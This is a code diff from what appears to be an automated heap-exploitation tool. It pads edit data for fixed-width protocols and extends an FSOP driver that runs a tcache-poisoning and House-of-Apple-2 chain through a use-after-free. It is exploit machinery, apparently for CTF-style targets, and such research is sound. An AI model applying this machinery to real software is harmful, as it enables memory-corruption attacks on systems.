@@ -308,7 +308,10 @@ def identify_heap_ops(workdir: Path, exe: Path, model: dict, opts: list, width) 
     edit = None
     for cand in [o for o in idx_only if o != view]:      # free-shaped options; one of them may be edit
         m2 = str(int.from_bytes(os.urandom(8), "big")).encode()[:16]
-        ew = menu._scalar(cand.encode(), width) + menu._scalar(b"0", width) + menu._data(m2, width)
+        # fixed-width: the data read may consume exactly the chunk size (0x80, the primed add below),
+        # so pad the marker to it or an exact-read loop waits forever and the edit never lands
+        body = m2.ljust(0x80, b"\x00") if width else m2
+        ew = menu._scalar(cand.encode(), width) + menu._scalar(b"0", width) + menu._data(body, width)
         writes = (_op_writes(add, model[add], width, idx=0, size=0x80, data=b"X" * 8)
                   + [ew]
                   + _op_writes(view, model[view], width, idx=0))
@@ -344,11 +347,11 @@ def _fsop_template(opt: str, fields: list) -> str | None:
 def fsop_templates(opts: list, model: dict, ops: dict, width) -> dict | None:
     """Build the FSOP driver's op templates from a crawled op-model, so a NON-canonical menu (not
     1=add/2=free/3=view/4=edit/5=exit) still drives the tcache-poison + House-of-Apple-2 chain. Needs
-    add/free/view AND edit (the UAF write that plants the poisoned fd). Line-based targets only (the
-    FSOP blob is raw bytes; a fixed-width protocol needs a different encoding). Returns
-    {add,free,view,edit,exit_seq} or None when a role or field shape is missing."""
-    if width:                                            # fixed-width binary protocol: not this driver
-        return None
+    add/free/view AND edit (the UAF write that plants the poisoned fd). The templates are
+    protocol-neutral -- newline-separated fields -- and the renderer (exploit_stage._heap_menu_render)
+    encodes them as lines or, for a fixed-width read(fd, buf, W) target (`width`), as W-padded scalars
+    plus a size-padded data buffer. Returns {add,free,view,edit,exit_seq} or None when a role or field
+    shape is missing."""
     if not all(ops.get(k) for k in ("add", "free", "view", "edit")):
         return None
     out: dict = {}
